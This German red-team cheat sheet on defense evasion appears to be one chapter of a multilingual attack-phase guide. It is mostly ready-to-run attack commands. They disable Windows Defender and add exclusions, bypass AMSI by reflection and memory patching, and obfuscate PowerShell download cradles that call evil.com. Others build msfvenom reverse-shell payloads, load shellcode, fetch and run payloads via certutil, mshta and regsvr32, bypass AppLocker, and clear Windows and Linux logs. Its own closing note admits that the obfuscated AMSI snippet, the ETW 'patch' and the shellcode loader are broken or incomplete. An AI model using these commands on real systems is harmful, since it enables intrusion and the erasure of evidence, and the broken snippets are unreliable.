# 🛡️ Phase 6: Umgehung von Schutzmaßnahmen (Defense Evasion)

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Ziel:** Sicherheitskontrollen (AV, EDR, AMSI, Firewalls) umgehen, um eine Erkennung zu vermeiden.

---

## 🛡️ Windows Defender umgehen

### Windows Defender deaktivieren (Administratorrechte erforderlich)
```powershell
# Echtzeitüberwachung deaktivieren
Set-MpPreference -DisableRealtimeMonitoring $true

# Alle Defender-Funktionen deaktivieren
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Ausnahmepfade hinzufügen
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Über die Registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Defender-Status prüfen
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 AMSI umgehen

### AMSI in PowerShell umgehen
```powershell
# Umgehung 1 – amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Umgehung 2 – Matt Graebers Einzeiler
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Umgehung 3 – Speicher verändern (Memory Patching)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Verschleierte AMSI-Umgehung
```powershell
# Zeichenketten verschleiern
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Payloads verschleiern

### PowerShell-Code verschleiern
```powershell
# Base64-Kodierung
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Zeichenketten verketten
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Binärdateien verschleiern
```bash
# Kodierung mit msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# Eigene XOR-Verarbeitung
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Shellcode-Loader
```c
// Einfacher Shellcode-Loader in C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Living Off The Land (LOLBins)

### Herunterladen und ausführen
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Payloads ausführen
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### AppLocker/WDAC umgehen
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 ETW/Protokollierung umgehen

### Event Tracing deaktivieren
```powershell
# ETW patchen
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Ereignisprotokolle leeren
```powershell
# Alle Protokolle leeren
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Alternativ Protokollierung deaktivieren
auditpol /clear /y
```

### PowerShell-Protokollierung deaktivieren
```powershell
# Script Block Logging deaktivieren
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Modulprotokollierung deaktivieren
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Schutzmaßnahmen unter Linux umgehen

### Timestomping (Zeitstempel manipulieren)
```bash
# Dateizeitstempel ändern
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Protokolle leeren
```bash
# bash-Verlauf leeren
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Systemprotokolle leeren
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Prozesse verbergen
```bash
# Prozessnamen verbergen
exec -a "[kworker/0:0]" ./malicious

# Verbergen mit LD_PRELOAD
# Bibliothek kompilieren, die readdir() abfängt, um Prozesse zu verbergen
```

---

## 🛠️ Werkzeuge

| Werkzeug | Zweck |
|------|---------|
| **Invoke-Obfuscation** | Verschleierung von PowerShell-Code |
| **Veil** | Payload-Erzeugung |
| **ScareCrow** | Payload-Generator zur EDR-Umgehung |
| **Donut** | Shellcode-Generator |
| **Nimcrypt2** | PE-Packer |
| **PEzor** | PE-Shellcode-Loader |

---

## 📊 Kurzreferenz

### Erkennungsmethoden und Umgehung

| Erkennung | Umgehungstechnik |
|-----------|------------------|
| Signaturbasiert | Verschleierung, Kodierung |
| AMSI | Speicherveränderungen, Umgehungsskripte |
| ETW | ETW-Patching |
| Protokollierung | Protokollierung deaktivieren, Protokolle leeren |
| AppLocker | LOLBins, Pfade zur Umgehung |
| Verhalten | Vorhandene Systemwerkzeuge verwenden |

### LOLBins-Kurzliste

| Programm | Verwendung |
|--------|-----|
| certutil | Dateien herunterladen |
| bitsadmin | Dateien herunterladen |
| mshta | HTA ausführen |
| rundll32 | DLL/JS ausführen |
| regsvr32 | SCT ausführen |
| msbuild | XML ausführen |
| installutil | EXE ausführen |

---

## 🔗 Weiterführende Cheatsheets

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Vorherige Phase:** [← 05 - Persistenz (Zugang aufrechterhalten)](./05-Persistence.de.md)

**Nächste Phase:** [07 - Umsetzung der Angriffsziele →](./07-Actions-Objectives.de.md)

---

## Hinweise zur deutschen Ausgabe

> **Versionshinweis:** Diese historischen Beispiele gewährleisten keine Umgehung aktueller Schutzprodukte. Microsoft dokumentiert Einschränkungen für `DisableAntiSpyware` sowie den Schutz von Einstellungen durch *Tamper Protection* (Manipulationsschutz). [Microsoft: DisableAntiSpyware](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/security-malware-windows-defender-disableantispyware)

> **Statische Prüfung der Vorlagen:** Die verschleierte AMSI-Zeichenkette enthält `{0telekinetic1}` und einen nicht durch die Argumentliste gedeckten Platzhalter `{3}`; sie ist in dieser Form fehlerhaft. Der ETW-Abschnitt deklariert lediglich `EtwEventWrite` und kompiliert die Deklaration; er verändert keinen Funktionscode und deaktiviert ETW nicht. Der C-Shellcode-Loader enthält einen unvollständigen Payload und ist kein vollständiges kompilierbares Programm. Base64 und Encoder dienen der Kodierung/Verschleierung und garantieren keine AV-/EDR-Umgehung. *LOLBins* sind vorhandene legitime Systemprogramme, die für andere Zwecke missbraucht werden.
